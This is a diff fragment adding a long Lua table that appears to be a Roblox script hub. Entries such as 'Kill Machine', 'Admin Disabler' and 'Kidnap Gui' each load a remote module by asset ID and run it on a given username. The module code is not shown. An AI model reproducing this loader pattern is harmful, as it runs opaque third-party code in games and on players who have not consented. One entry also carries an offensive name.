+			Function = function(Username: string) import(6764771009).run(Username) end
+		},
+		{
+			Name = "Orb Visualiser [>play id]",
+			Function = function(Username: string) import(4840756025)(Username) end
+		},
+		{
+			Name = "Psychocider",
+			Function = function(Username: string) import(7622273041):Fire(Username, "i baked you a pie") end
+		},
+		{
+			Name = "Godspeed",
+			Function = function(Username: string) import(3957090799).load(Username) end
+		},
+		{
+			Name = "Malus",
+			Function = function(Username: string) import(6226860871).load(Username) end
+		},
+		{
+			Name = "The Alchemist",
+			Function = function(Username: string) import(6224178099).load(Username) end
+		},
+		{
+			Name = "Shouto Todoroki",
+			Function = function(Username: string) import(6646850627).load(Username) end
+		},
+		{
+			Name = "Fumo Cirno",
+			Function = function(Username: string) import(6838409424).load(Username) end
+		},
+		{
+			Name = "Kanna",
+			Function = function(Username: string) import(03485547628).load(Username) end
+		},
+		{
+			Name = "The World Crazy Edit",
+			Function = function(Username: string) import(0x15d0d1a90)("jojo", Username) end
+		},
+		{
+			Name = "Hallow The World",
+			Function = function(Username: string) import(6498729741)("HW", Username) end
+		},
+		{
+			Name = "Made In Heaven",
+			Function = function(Username: string) import(4902600443)("MIH", Username) end
+		},
+		{
+			Name = "King Crimson",
+			Function = function(Username: string) import(4902600443)("KC", Username) end
+		},
+		{
+			Name = "Shadow The World Requiem",
+			Function = function(Username: string) import(6497734492)("STWR", Username) end
+		},
+		{
+			Name = "The World Over Heaven",
+			Function = function(Username: string) import(4902600443)("TWOH", Username) end
+		},
+		{
+			Name = "Stand Arrow",
+			Function = function(Username: string) import(4902600443)("Arrow", Username) end
+		},
+		{
+			Name = "Killer Queen",
+			Function = function(Username: string) import(4902600443)("KQ", Username) end
+		},
+		{
+			Name = "Uderpzal",
+			Function = function(Username: string) import(5931089380).uderpzal(Username) end
+		},
+		{
+			Name = "Rayman",
+			Function = function(Username: string) import(6801506680).load(Username) end
+		},
+		{
+			Name = "Deathwish",
+			Function = function(Username: string) import(6798837348).Deathwish(Username) end
+		},
+		{
+			Name = "Derpz Hoverboard",
+			Function = function(Username: string) import(6788741042).load(Username) end
+		},
+		{
+			Name = "Coup D'etat",
+			Function = function(Username: string) import(6224174695).load(Username) end
+		},
+		{
+			Name = "Star Redemption",
+			Function = function(Username: string) import(6226090258).load(Username) end
+		},
+		{
+			Name = "Yannies's SGR",
+			Function = function(Username: string) import(5620001187).csg(Username) end
+		},
+		{
+			Name = "Another",
+			Function = function(Username: string) import(5659724224).load(Username) end
+		},
+		{
+			Name = "BlueGuestreborn1's Script",
+			Function = function(Username: string) import(6365402810).load(Username) end
+		},
+		{
+			Name = "Hololive Fubuki",
+			Function = function(Username: string) import(5907637844).load(Username) end
+		},
+		{
+			Name = "Kill Machine",
+			Function = function(Username: string) import(6375409514).load(Username) end
+		},
+		{
+			Name = "Light",
+			Function = function(Username: string) import(6288466793).load(Username) end
+		},
+		{
+			Name = "Rune",
+			Function = function(Username: string) import(6300537800).load(Username) end
+		},
+		{
+			Name = "Koreman",
+			Function = function(Username: string) import(6364332345).me(Username) end
+		},
+		{
+			Name = "Dimensiona",
+			Function = function(Username: string) import(4957540270).load(Username) end
+		},
+		{
+			Name = "Firey Switcher",
+			Function = function(Username: string) import(5748722400).eliza(Username) end
+		},
+		{
+			Name = "SGR Edit",
+			Function = function(Username: string) import(4721742420):SpectrumOP(Username) end
+		},
+		{
+			Name = "Zero Switcher",
+			Function = function(Username: string) import(5745831816):Alpha(Username) end
+		},
+		{
+			Name = "Drone Minigun",
+			Function = function(Username: string) import(5248023821).load(Username) end
+		},
+		{
+			Name = "War Phoenix",
+			Function = function(Username: string) import(6569530296).load(Username) end
+		},
+		{
+			Name = "Green Lantern",
+			Function = function(Username: string) import(6513716743).load(Username) end
+		},
+		{
+			Name = "APC Tank",
+			Function = function(Username: string) import(6569622359).load(Username) end
+		},
+		{
+			Name = "Kazotsky Kick",
+			Function = function(Username: string) import(6728874428).basskick(Username) end
+		},
+		{
+			Name = "Uber God V2",
+			Function = function(Username: string) import(6511253627).load(Username) end
+		},
+		{
+			Name = "Pro Knife",
+			Function = function(Username: string) import(6569617509).load(Username) end
+		},
+		{
+			Name = "Tangel",
+			Function = function(Username: string) import(6226452825).load(Username) end
+		},
+		{
+			Name = "Project Scripted V2.1",
+			Function = function(Username: string) import(6725297744):Scripted(Username) end
+		},
+		{
+			Name = "Split Head",
+			Function = function(Username: string) import(5760009753).load(Username) end
+		},
+		{
+			Name = "Emma U V2",
+			Function = function(Username: string) import(6226173369).load(Username) end
+		},
+		{
+			Name = "Killbot V3",
+			Function = function(Username: string) import(6688474792).load(Username) end
+		},
+		{
+			Name = "Noobygames Dark Staff",
+			Function = function(Username: string) import(14746489408)(Username) end
+		},
+		{
+			Name = "Musketeer",
+			Function = function(Username: string) import(6583606008).load(Username) end
+		},
+		{
+			Name = "Amethyst Mask",
+			Function = function(Username: string) import(6583574020).load(Username) end
+		},
+		{
+			Name = "Magic 8ball",
+			Function = function(Username: string) import(6438191748).load(Username) end
+		},
+		{
+			Name = "Hellset",
+			Function = function(Username: string) import(6569726017)[Username] = "Dark" end
+		},
+		{
+			Name = "Fight Mode",
+			Function = function(Username: string) import(6438401832).load(Username) end
+		},
+		{
+			Name = "Lightning Fighter",
+			Function = function(Username: string) import(5813888007).load(Username) end
+		},
+		{
+			Name = "Charlie Chaplin",
+			Function = function(Username: string) import(6606289064).load(Username) end
+		},
+		{
+			Name = "God's Abandoned Daughter V2",
+			Function = function(Username: string) import(5151004305).load(Username) end
+		},
+		{
+			Name = "R15 Giant Hulk",
+			Function = function(Username: string) import(6587614770).load(Username) end
+		},
+		{
+			Name = "Ruin Finale",
+			Function = function(Username: string) import(6473649573).load(Username) end
+		},
+		{
+			Name = "Smite",
+			Function = function(Username: string) import(14746526099)(Username) end
+		},
+		{
+			Name = "Marenol",
+			Function = function(Username: string) import(6473758752).load(Username) end
+		},
+		{
+			Name = "Spectre",
+			Function = function(Username: string) import(6058222319).load(Username) end
+		},
+		{
+			Name = "Luster's Pirate",
+			Function = function(Username: string) import(6543481472).load(Username) end
+		},
+		{
+			Name = "Lunatic",
+			Function = function(Username: string) import(5813708464).load(Username) end
+		},
+		{
+			Name = "Grab Killer",
+			Function = function(Username: string) import(6460913193).load(Username) end
+		},
+		{
+			Name = "Dread Hunter",
+			Function = function(Username: string) import(6511194429).load(Username) end
+		},
+		{
+			Name = "Burn",
+			Function = function(Username: string) import(6478479994).load(Username) end
+		},
+		{
+			Name = "Cyber Dominus",
+			Function = function(Username: string) import(6511258944).load(Username) end
+		},
+		{
+			Name = "Glockcider",
+			Function = function(Username: string) import(14649778095)(Username) end
+		},
+		{
+			Name = "Oros Staff",
+			Function = function(Username: string) import(6099971134).load(Username) end
+		},
+		{
+			Name = "Guts V2",
+			Function = function(Username: string) import(6438169891).load(Username) end
+		},
+		{
+			Name = "Dominus Coelum",
+			Function = function(Username: string) import(6489672292).load(Username) end
+		},
+		{
+			Name = "Vronicus",
+			Function = function(Username: string) import(6485092713).load(Username) end
+		},
+		{
+			Name = "Radioactive Reaper",
+			Function = function(Username: string) import(6478070465).load(Username) end
+		},
+		{
+			Name = "Brew Pot",
+			Function = function(Username: string) import(6438188455).load(Username) end
+		},
+		{
+			Name = "Dominus Praefectus",
+			Function = function(Username: string) import(6472920124).load(Username) end
+		},
+		{
+			Name = "Spazzing Out",
+			Function = function(Username: string) import(6455499392).load(Username) end
+		},
+		{
+			Name = "Junkbot",
+			Function = function(Username: string) import(6438196691)(Username,"JUNKBOT") end
+		},
+		{
+			Name = "Chips",
+			Function = function(Username: string) import(5097644333).load(Username) end
+		},
+		{
+			Name = "Light Circlet",
+			Function = function(Username: string) import(5813748809).load(Username) end
+		},
+		{
+			Name = "Rannoch",
+			Function = function(Username: string) import(6375564504).load(Username) end
+		},
+		{
+			Name = "The Holiest Wrench",
+			Function = function(Username: string) import(6419718698).load(Username) end
+		},
+		{
+			Name = "Dearsister Pistol",
+			Function = function(Username: string) import(6332990586).load(Username) end
+		},
+		{
+			Name = "Ice Walker",
+			Function = function(Username: string) import(6319945511).load(Username) end
+		},
+		{
+			Name = "Ancient Magician",
+			Function = function(Username: string) import(6352223238).load(Username) end
+		},
+		{
+			Name = "The Nightfall",
+			Function = function(Username: string) import(6319870493).load(Username) end
+		},
+		{
+			Name = "False God",
+			Function = function(Username: string) import(6058215921).load(Username) end
+		},
+		{
+			Name = "RachJumper",
+			Function = function(Username: string) import(6099334284).load(Username) end
+		},
+		{
+			Name = "Aeshma",
+			Function = function(Username: string) import(6342834455).load(Username) end
+		},
+		{
+			Name = "Operation Noob Event",
+			Function = function(Username: string) import(6269838898).load() end
+		},
+		{
+			Name = "Voodoo Child V2",
+			Function = function(Username: string) import(6191675567).load(Username) end
+		},
+		{
+			Name = "Voodoo Child",
+			Function = function(Username: string) import(6191659992).load(Username) end
+		},
+		{
+			Name = "Gem Master",
+			Function = function(Username: string) import(5935318869).load(Username) end
+		},
+		{
+			Name = "Sakura Blade",
+			Function = function(Username: string) import(6226360016).load(Username) end
+		},
+		{
+			Name = "Clarant Blade",
+			Function = function(Username: string) import(6099967332).load(Username) end
+		},
+		{
+			Name = "Broly",
+			Function = function(Username: string) import(6029173293).load(Username) end
+		},
+		{
+			Name = "Marx",
+			Function = function(Username: string) import(5813723371).load(Username) end
+		},
+		{
+			Name = "Magma Defender",
+			Function = function(Username: string) import(5813766312).load(Username) end
+		},
+		{
+			Name = "Emer",
+			Function = function(Username: string) import(5813759403).load(Username) end
+		},
+		{
+			Name = "Fake Noot Noot",
+			Function = function(Username: string) import(4661083363).eliza() end
+		},
+		{
+			Name = "Helkern Mech",
+			Function = function(Username: string) import(5813823244).load(Username) end
+		},
+		{
+			Name = "Polaris Cube",
+			Function = function(Username: string) import(6583577614).load(Username) end
+		},
+		{
+			Name = "Senko",
+			Function = function(Username: string) import(6538030830).SenkoSan(Username) end
+		},
+		{
+			Name = "Can't Sleep",
+			Function = function(Username: string) import(6225799838).run(Username) end
+		},
+		{
+			Name = "Maddox",
+			Function = function(Username: string) import(14746543718)(Username) end
+		},
+		{
+			Name = "Mrs. Bye Bye",
+			Function = function(Username: string) import(4945682948).load(Username) end
+		},
+		{
+			Name = "Pandora",
+			Function = function(Username: string) import(3547672868).p11(Username) end
+		},
+		{
+			Name = "Pink Barbie Car",
+			Function = function(Username: string) import(4745872847).load(Username) end
+		},
+		{
+			Name = "ROAD ROLLER DA",
+			Function = function(Username: string) import(14746554966)(Username) end
+		},
+		{
+			Name = "Star Platinum",
+			Function = function(Username: string) import(5534238329)(Username, "StarPlatinum") end
+		},
+		{
+			Name = "The All Seeing Hand",
+			Function = function(Username: string) import(5375399205).Player(Username) end
+		},
+		{
+			Name = "The World",
+			Function = function(Username: string) import(4902600443)("TW", Username) end
+		},
+		{
+			Name = "Toxicity",
+			Function = function(Username: string) import(4936620258):Fire(Username) end
+		},
+		{
+			Name = "Andrfixs Msg Edit",
+			Function = function(Username: string) import(6134077425)(Username) end
+		},
+		{
+			Name = "I N S A N I T Y",
+			Function = function(Username: string) import(6223977609).Insanity(Username) end
+		},
+		{
+			Name = "Hell Dominus",
+			Function = function(Username: string) import(5396767447).load(Username) end
+		},
+		{
+			Name = "Chillingo",
+			Function = function(Username: string) import(6126846548).load(Username) end
+		},
+		{
+			Name = "4 Spin Shuriken",
+			Function = function(Username: string) import(14746567805)(Username) end
+		},
+		{
+			Name = "500 Pound Ball",
+			Function = function(Username: string) import(5018462111):Fire(Username) end
+		},
+		{
+			Name = "ASG",
+			Function = function(Username: string) import(5306145175).eliza(Username) end
+		},
+		{
+			Name = "ASHA",
+			Function = function(Username: string) import(5408257176).c3(Username) end
+		},
+		{
+			Name = "AXR Piercer",
+			Function = function(Username: string) import(5014529750):Fire(Username) end
+		},
+		{
+			Name = "Asylum",
+			Function = function(Username: string) import(14649970075)(Username) end
+		},
+		{
+			Name = "Asylum V2",
+			Function = function(Username: string) import(14649982043)(Username) end
+		},
+		{
+			Name = "AdNOnis",
+			Function = function(Username: string) import(5908631416)() end
+		},
+		{
+			Name = "Admin Disabler",
+			Function = function(Username: string) import(5293427850).op("very op yes") end
+		},
+		{
+			Name = "Aether Bracelet",
+			Function = function(Username: string) import(14746941864)(Username) end
+		},
+		{
+			Name = "Agent Agony",
+			Function = function(Username: string) import(14174465891)(Username) end
+		},
+		{
+			Name = "Agent Wesker",
+			Function = function(Username: string) import(4932690106).load(Username) end
+		},
+		{
+			Name = "Ali",
+			Function = function(Username: string) import(14175904153)(Username) end
+		},
+		{
+			Name = "Angel",
+			Function = function(Username: string) import(4671838873).load(Username) end
+		},
+		{
+			Name = "Angel And Demon",
+			Function = function(Username: string) import(5166703170).load(Username, "hack") end
+		},
+		{
+			Name = "Angelic Rainbow Goner",
+			Function = function(Username: string) import(4939833529).G(Username) end
+		},
+		{
+			Name = "Another Sans",
+			Function = function(Username: string) import(4952709475).load(Username) end
+		},
+		{
+			Name = "Another Scythe",
+			Function = function(Username: string) import(4810850766).Fire(Username) end
+		},
+		{
+			Name = "Aquatic Mage",
+			Function = function(Username: string) import(14746966083)(Username) end
+		},
+		{
+			Name = "Arch Angel",
+			Function = function(Username: string) import(2972034986):Fire(Username, "test") end
+		},
+		{
+			Name = "Ares the Bladist",
+			Function = function(Username: string) import(5813806760).load(Username) end
+		},
+		{
+			Name = "Armo Drill Hand",
+			Function = function(Username: string) import(14746983225)(Username) end
+		},
+		{
+			Name = "Armor Money Stand",
+			Function = function(Username: string) import(5164017575)("TH", Username) end
+		},
+		{
+			Name = "Artemis Sword",
+			Function = function(Username: string) import(14748166071)(Username) end
+		},
+		{
+			Name = "Articulacy",
+			Function = function(Username: string) import(5730283203).Articulacy(Username) end
+		},
+		{
+			Name = "Axiomette",
+			Function = function(Username: string) import(5018330008):Fire(Username) end
+		},
+		{
+			Name = "Balance God",
+			Function = function(Username: string) import(14748169733)(Username) end
+		},
+		{
+			Name = "Bald Man With Powers",
+			Function = function(Username: string) import(5176617106).load(Username, "hack") end
+		},
+		{
+			Name = "Baldi",
+			Function = function(Username: string) import(4655442549).Fire(Username) end
+		},
+		{
+			Name = "Banzai Bazooka",
+			Function = function(Username: string) import(14748304816)(Username) end
+		},
+		{
+			Name = "Baseball Bat V4",
+			Function = function(Username: string) import(4559963876).load(Username) end
+		},
+		{
+			Name = "Beerus",
+			Function = function(Username: string) import(14749012026)(Username) end
+		},
+		{
+			Name = "Betty Noire",
+			Function = function(Username: string) import(5139373601).load(Username) end
+		},
+		{
+			Name = "Big Daddy",
+			Function = function(Username: string) import(14174930725)(Username) end
+		},
+		{
+			Name = "Big Hammer",
+			Function = function(Username: string) import(14749035118)(Username) end
+		},
+		{
+			Name = "Big Smoke",
+			Function = function(Username: string) import(14749038309)(Username) end
+		},
+		{
+			Name = "Billie Eilish",
+			Function = function(Username: string) import(6213717452).load(Username) end
+		},
+		{
+			Name = "Black Dragon Exe",
+			Function = function(Username: string) import(14749044158)(Username) end
+		},
+		{
+			Name = "Black King Crismon",
+			Function = function(Username: string) import(5164017575)("WS", Username) end
+		},
+		{
+			Name = "Blade Magician",
+			Function = function(Username: string) import(4696442000).load(Username, "loaf") end
+		},
+		{
+			Name = "Blind Reaper",
+			Function = function(Username: string) import(4665382251).load(Username) end
+		},
+		{
+			Name = "Boom X4",
+			Function = function(Username: string) import(2830670878):Run(Username, "i baked you a pie") end
+		},
+		{
+			Name = "Bow Master",
+			Function = function(Username: string) import(4529618784).bruh(Username) end
+		},
+		{
+			Name = "Brick Hamman",
+			Function = function(Username: string) import(14749048095)(Username) end
+		},
+		{
+			Name = "Brutal Anti Furry",
+			Function = function(Username: string) import(5062592514).load(Username) end
+		},
+		{
+			Name = "Brutal Overlord",
+			Function = function(Username: string) import(14174899510)(Username) end
+		},
+		{
+			Name = "Burning Darkness",
+			Function = function(Username: string) import(5209951430).load(Username) end
+		},
+		{
+			Name = "Cactos The Fallen God",
+			Function = function(Username: string) import(4667578923).jacob(Username) end
+		},
+		{
+			Name = "Cadilac",
+			Function = function(Username: string) import(4745872847).load(Username) end
+		},
+		{
+			Name = "Calamity",
+			Function = function(Username: string) import(4692253735):Start(Username, "AAA") end
+		},
+		{
+			Name = "Calamity V2",
+			Function = function(Username: string) import(14749052151)(Username) end
+		},
+		{
+			Name = "Chain Magician",
+			Function = function(Username: string) import(14749058289)(Username) end
+		},
+		{
+			Name = "Chaos",
+			Function = function(Username: string) import(14749061290)(Username) end
+		},
+		{
+			Name = "Chaotic God",
+			Function = function(Username: string) import(14819303769)(Username) end
+		},
+		{
+			Name = "Chara EDIT",
+			Function = function(Username: string) import(14819308576)(Username) end
+		},
+		{
+			Name = "ChemZBye",
+			Function = function(Username: string) import(5024271070):Start(Username, "AAA") end
+		},
+		{
+			Name = "Christmas Demolitionist",
+			Function = function(Username: string) import(6032614184).load(Username) end
+		},
+		{
+			Name = "Chrono Sentinel",
+			Function = function(Username: string) import(14819317204)(Username) end
+		},
+		{
+			Name = "Cop",
+			Function = function(Username: string) import(14819335079)(Username) end
+		},
+		{
+			Name = "Corrupted V2",
+			Function = function(Username: string) import(4864346299).load(Username) end
+		},
+		{
+			Name = "Crazy Diamond",
+			Function = function(Username: string) import(4902600443)("CD" ,Username) end
+		},
+		{
+			Name = "Creeper",
+			Function = function(Username: string) import(4708818072).Oaeh(Username) end
+		},
+		{
+			Name = "Cross Sans",
+			Function = function(Username: string) import(14819347569)(Username) end
+		},
+		{
+			Name = "Cube Buster",
+			Function = function(Username: string) import(4661906279).load(Username) end
+		},
+		{
+			Name = "Cubix",
+			Function = function(Username: string) import(14934691532)(Username) end
+		},
+		{
+			Name = "Cyber Monarch",
+			Function = function(Username: string) import(14934718144)(Username) end
+		},
+		{
+			Name = "Cyber Warden",
+			Function = function(Username: string) import(2945942634):Fire(Username, "hack") end
+		},
+		{
+			Name = "DOE",
+			Function = function(Username: string) import(5408044316).c3(Username) end
+		},
+		{
+			Name = "Dark Noob Staff",
+			Function = function(Username: string) import(14746489408)(Username) end
+		},
+		{
+			Name = "Death",
+			Function = function(Username: string) import(4653294841).load(Username) end
+		},
+		{
+			Name = "Death Claws",
+			Function = function(Username: string) import(5030542276).load(Username) end
+		},
+		{
+			Name = "Demise",
+			Function = function(Username: string) import(5030531978).load(Username) end
+		},
+		{
+			Name = "Desolate",
+			Function = function(Username: string) import(6088494183).load(Username) end
+		},
+		{
+			Name = "Dio Sans",
+			Function = function(Username: string) import(5012377657).Stand(Username) end
+		},
+		{
+			Name = "Disturbed",
+			Function = function(Username: string) import(6099363076).load(Username) end
+		},
+		{
+			Name = "Dominant",
+			Function = function(Username: string) import(4470057542).load(Username) end
+		},
+		{
+			Name = "Dominus Corona",
+			Function = function(Username: string) import(14175091336)(Username) end
+		},
+		{
+			Name = "Dominus Phaedra",
+			Function = function(Username: string) import(14175087575)(Username) end
+		},
+		{
+			Name = "Dominus Switcher",
+			Function = function(Username: string) import(3424188196).load(Username) end
+		},
+		{
+			Name = "Double Guns",
+			Function = function(Username: string) import(4701773380).load(Username) end
+		},
+		{
+			Name = "Dssj3v2",
+			Function = function(Username: string) import(5051013449).load(Username) end
+		},
+		{
+			Name = "Dubstep Gun",
+			Function = function(Username: string) import(4442010059).load(Username) end
+		},
+		{
+			Name = "Dynamo",
+			Function = function(Username: string) import(3592159943).load(Username) end
+		},
+		{
+			Name = "Eerin",
+			Function = function(Username: string) import(15407358163)(Username) end
+		},
+		{
+			Name = "Egg Dog",
+			Function = function(Username: string) import(4460809464).load(Username) end
+		},
+		{
+			Name = "Wunderwaffe",
+			Function = function(Username: string) import(15407406144)(Username) end
+		},
+		{
+			Name = "Emoji God",
+			Function = function(Username: string) import(5823684505).load(Username) end
+		},
+		{
+			Name = "Empyr",
+			Function = function(Username: string) import(15407490722)(Username) end
+		},
+		{
+			Name = "Empyrous",
+			Function = function(Username: string) import(15563078873)(Username) end
+		},
+		{
+			Name = "Ender V4",
+			Function = function(Username: string) import(6226531940).load(Username) end
+		},
+		{
+			Name = "Evil Horsemen",
+			Function = function(Username: string) import(3737497650).load(Username) end
+		},
+		{
+			Name = "Exoliner",
+			Function = function(Username: string) import(5002669725):Exoliner("lol", Username) end
+		},
+		{
+			Name = "Eyo-Zen",
+			Function = function(Username: string) import(15563086115)(Username) end
+		},
+		{
+			Name = "Fallen Anger",
+			Function = function(Username: string) import(15563140290)(Username) end
+		},
+		{
+			Name = "Fcsrz",
+			Function = function(Username: string) import(5084695239).eliza(Username) end
+		},
+		{
+			Name = "Felipe Ascension",
+			Function = function(Username: string) import(5339034667):Start(Username, "AAA") end
+		},
+		{
+			Name = "Felipe Ascension Full",
+			Function = function(Username: string) import(6091257111).eliza(Username) end
+		},
+		{
+			Name = "Felipe EDIT",
+			Function = function(Username: string) import(5419572761):Start(Username, "Admin") end
+		},
+		{
+			Name = "Flamingo Platinum",
+			Function = function(Username: string) import(4902600443)("FP", Username) end
+		},
+		{
+			Name = "Flying Teat Ball",
+			Function = function(Username: string) import(5185119522).load(Username, "hack") end
+		},
+		{
+			Name = "Force Choke",
+			Function = function(Username: string) import(5030052105).load(Username) end
+		},
+		{
+			Name = "Frieza",
+			Function = function(Username: string) import(15563151481)(Username) end
+		},
+		{
+			Name = "GFC",
+			Function = function(Username: string) import(5408062229).c3(Username) end
+		},
+		{
+			Name = "GLOB",
+			Function = function(Username: string) import(5408227768).c3(Username) end
+		},
+		{
+			Name = "Gaster",
+			Function = function(Username: string) import(15563196993)(Username) end
+		},
+		{
+			Name = "Genocider",
+			Function = function(Username: string) import(14649792035)(Username) end
+		},
+		{
+			Name = "Giant Glock Gun",
+			Function = function(Username: string) import(2959952198):Fire(Username, "test") end
+		},
+		{
+			Name = "Giant Ultra Sans",
+			Function = function(Username: string) import(5336360739).eliza(Username) end
+		},
+		{
+			Name = "Giorgio Sans",
+			Function = function(Username: string) import(4930325164).load(Username) end
+		},
+		{
+			Name = "Girl Reaper",
+			Function = function(Username: string) import(03219306353).load(Username) end
+		},
+		{
+			Name = "Gladiator",
+			Function = function(Username: string) import(3507004797).load(Username) end
+		},
+		{
+			Name = "Gnome Launcher",
+			Function = function(Username: string) import(4907001821).gnome(Username) end
+		},
+		{
+			Name = "God Of Shapes",
+			Function = function(Username: string) import(4702356401).load(Username) end
+		},
+		{
+			Name = "God Slayer",
+			Function = function(Username: string) import(4698941018).load(Username) end
+		},
+		{
+			Name = "God Stand",
+			Function = function(Username: string) import(5237540972).load(Username) end
+		},
+		{
+			Name = "God's Abandoned Daughter",
+			Function = function(Username: string) import(5151004305).load(Username) end
+		},
+		{
+			Name = "Golden Gun",
+			Function = function(Username: string) import(4670612751).load(Username) end
+		},
+		{
+			Name = "Golden Ring",
+			Function = function(Username: string) import(4769118199).load(Username) end
+		},
+		{
+			Name = "Good Cop",
+			Function = function(Username: string) import(4697514241).load(Username) end
+		},
+		{
+			Name = "Grab Gun",
+			Function = function(Username: string) import(4804256797):Fire(Username,"a") end
+		},
+		{
+			Name = "Grab Knife V1",
+			Function = function(Username: string) import(14770923873)(Username) end
+		},
+		{
+			Name = "Grab Knife V2",
+			Function = function(Username: string) import(14770910457)(Username) end
+		},
+		{
+			Name = "Grab Knife V3",
+			Function = function(Username: string) import(14174586973)(Username) end
+		},
+		{
+			Name = "Grab Knife V4",
+			Function = function(Username: string) import(14770927892)(Username) end
+		},
+		{
+			Name = "Grab Knife V4 Premium",
+			Function = function(Username: string) import(14463703157)(Username) end
+		},
+		{
+			Name = "Grass Man",
+			Function = function(Username: string) import(5209210329).load(Username) end
+		},
+		{
+			Name = "Grav Hammer",
+			Function = function(Username: string) import(4702851632).load(Username) end
+		},
+		{
+			Name = "Guardian Gate Keeper",
+			Function = function(Username: string) import(5072179438).eliza(Username) end
+		},
+		{
+			Name = "Gun MLG",
+			Function = function(Username: string) import(4768250046).load(Username) end
+		},
+		{
+			Name = "Assassin",
+			Function = function(Username: string) import(5217353294).load(Username) end
+		},
+		{
+			Name = "HAM",
+			Function = function(Username: string) import(5408070604).c3(Username) end
+		},
+		{
+			Name = "Hacker",
+			Function = function(Username: string) import(4982745702).load(Username) end
+		},
+		{
+			Name = "Hacksaw",
+			Function = function(Username: string) import(4560014954).load(Username) end
+		},
+		{
+			Name = "Hallow Slayer",
+			Function = function(Username: string) import(2675506369).hal(Username) end
+		},
+		{
+			Name = "Headphones",
+			Function = function(Username: string) import(5003772814).load(Username) end
+		},
+		{
+			Name = "Holiday Feelings Edit",
+			Function = function(Username: string) import(5798223634).load(Username) end
+		},
+		{
+			Name = "Hoodie Stand",
+			Function = function(Username: string) import(5164017575)("KCR", Username) end
+		},
+		{
+			Name = "Hover Bike",
+			Function = function(Username: string) import(4652456395).load(Username) end
+		},
+		{
+			Name = "R15 Hover Bike",
+			Function = function(Username: string) import(6701182073).load(Username) end
+		},
+		{
+			Name = "Hype Unleashed",
+			Function = function(Username: string) import(4469835482).load(Username) end
+		},
+		{
+			Name = "I.R.O.N",
+			Function = function(Username: string) import(4736979488).load(Username) end
+		},
+		{
+			Name = "Ice Cream",
+			Function = function(Username: string) import(14174940360)(Username) end
+		},
+		{
+			Name = "Ice Neptunian",
+			Function = function(Username: string) import(14217318302)(Username) end
+		},
+		{
+			Name = "Iluminati",
+			Function = function(Username: string) import(2945897470):Fire(Username, "hack") end
+		},
+		{
+			Name = "Imposter",
+			Function = function(Username: string) import(5828018389)(Username) end
+		},
+		{
+			Name = "Incension",
+			Function = function(Username: string) import(17314661188)(Username) end
+		},
+		{
+			Name = "Indrish Zrestik",
+			Function = function(Username: string) import(5019013695):Fire(Username) end
+		},
+		{
+			Name = "Inferno",
+			Function = function(Username: string) import(4698997515).load(Username) end
+		},
+		{
+			Name = "Infinity Gaunglet",
+			Function = function(Username: string) import(4622105140).load(Username) end
+		},
+		{
+			Name = "Infinity Gaunglet V2",
+			Function = function(Username: string) import(5332028482).eliza(Username) end
+		},
+		{
+			Name = "Influx",
+			Function = function(Username: string) import(5089116221).load(Username) end
+		},
+		{
+			Name = "Insane Geocider",
+			Function = function(Username: string) import(14649798493)(Username) end
+		},
+		{
+			Name = "Iron Man",
+			Function = function(Username: string) import(4949149864)(Username) end
+		},
+		{
+			Name = "Iron Nazi",
+			Function = function(Username: string) import(5493872436).eliza(Username) end
+		},
+		{
+			Name = "Is Gone",
+			Function = function(Username: string) import(2800498919):Run(Username, "i baked you a pie") end
+		},
+		{
+			Name = "Jester",
+			Function = function(Username: string) import(4670278173).load(Username) end
+		},
+		{
+			Name = "JoJo Gaunglet",
+			Function = function(Username: string) import(4570858053).load(Username) end
+		},
+		{
+			Name = "JoJo Stands",
+			Function = function(Username: string) import(5029154308).skid(Username) end
+		},
+		{
+			Name = "John Doe",
+			Function = function(Username: string) import(4622189585).load(Username) end
+		},
+		{
+			Name = "John Doe Blaster",
+			Function = function(Username: string) import(4963046652).load(Username) end
+		},
+		{
+			Name = "John Wick",
+			Function = function(Username: string) import(4721853215):Fire(Username) end
+		},
+		{
+			Name = "Jump In The Caac",
+			Function = function(Username: string) import(4702631513).load(Username) end
+		},
+		{
+			Name = "KAOI",
+			Function = function(Username: string) import(5408161881).c3(Username) end
+		},
+		{
+			Name = "Karambit",
+			Function = function(Username: string) import(4652908514).load(Username) end
+		},
+		{
+			Name = "Kazoo Kid",
+			Function = function(Username: string) import(4827295805).load(Username) end
+		},
+		{
+			Name = "Kidnap Gui",
+			Function = function(Username: string) import(5121582789).load(Username) end
+		},
+		{
+			Name = "Killbot GKB",
+			Function = function(Username: string) import(5334345785).eliza(Username) end
+		},
+		{
+			Name = "Killbot V1",
+			Function = function(Username: string) import(5060486878).load(Username) end
+		},
+		{
+			Name = "Killbot V2",
+			Function = function(Username: string) import(4612625355).load(Username) end
+		},
+		{
+			Name = "Killbot V2 Edit",
+			Function = function(Username: string) import(4938336305).load(Username) end
+		},
+		{
+			Name = "Killbot V2 Official",
+			Function = function(Username: string) import(14631382769)(Username) end
+		},
+		{
+			Name = "King Ashoal Hammer",
+			Function = function(Username: string) import(4932680647).load(Username) end
+		},
+		{
+			Name = "Kirito Blades",
+			Function = function(Username: string) import(4692761134).load(Username) end
+		},
+		{
+			Name = "Kitchen Gun",
+			Function = function(Username: string) import(4692732456).load(Username) end
+		},
+		{
+			Name = "Krystal Dance",
+			Function = function(Username: string) import(15678202648)(Username) end
+		},
+		{
+			Name = "Kuma",
+			Function = function(Username: string) import(6099324864).load(Username) end
+		},
+		{
+			Name = "Lost Dead Astronaut",
+			Function = function(Username: string) import(5014286842):Fire(Username) end
+		},
+		{
+			Name = "Lunar Rabbit",
+			Function = function(Username: string) import(5166762777).load(Username,"hack") end
+		},
+		{
+			Name = "Lustris V1",
+			Function = function(Username: string) import(2845906776).ooga(Username) end
+		},
+		{
+			Name = "Lustris V2",
+			Function = function(Username: string) import(4867877044).load(Username) end
+		},
+		{
+			Name = "M16A3",
+			Function = function(Username: string) import(4738642243).load(Username) end
+		},
+		{
+			Name = "Magic Broadsword",
+			Function = function(Username: string) import(4941688312).load(Username) end
+		},
+		{
+			Name = "Magic Warrior",
+			Function = function(Username: string) import(5201019051).load(Username, "i baked you a pie") end
+		},
+		{
+			Name = "Magma Blade",
+			Function = function(Username: string) import(5014563257):Fire(Username) end
+		},
+		{
+			Name = "Mario Stand",
+			Function = function(Username: string) import(5154400874).load(Username) end
+		},
+		{
+			Name = "Master Of Elements",
+			Function = function(Username: string) import(4613142557).load(Username) end
+		},
+		{
+			Name = "Mega Titan",
+			Function = function(Username: string) import(4875502693).load(Username) end
+		},
+		{
+			Name = "More Guns",
+			Function = function(Username: string) import(4922496226).Dreamer(Username) end
+		},
+		{
+			Name = "Motolov",
+			Function = function(Username: string) import(4738637093).load(Username) end
+		},
+		{
